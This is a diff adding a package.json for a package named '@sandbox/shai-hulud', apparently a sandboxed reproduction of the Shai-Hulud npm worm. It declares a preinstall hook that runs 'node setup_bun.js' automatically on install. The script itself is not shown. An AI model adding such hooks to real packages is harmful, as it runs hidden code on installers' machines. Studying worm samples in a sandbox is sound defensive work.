@@ -1,0 +1,7 @@
+{
+  "name": "@sandbox/shai-hulud",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node setup_bun.js"
+  }
+}
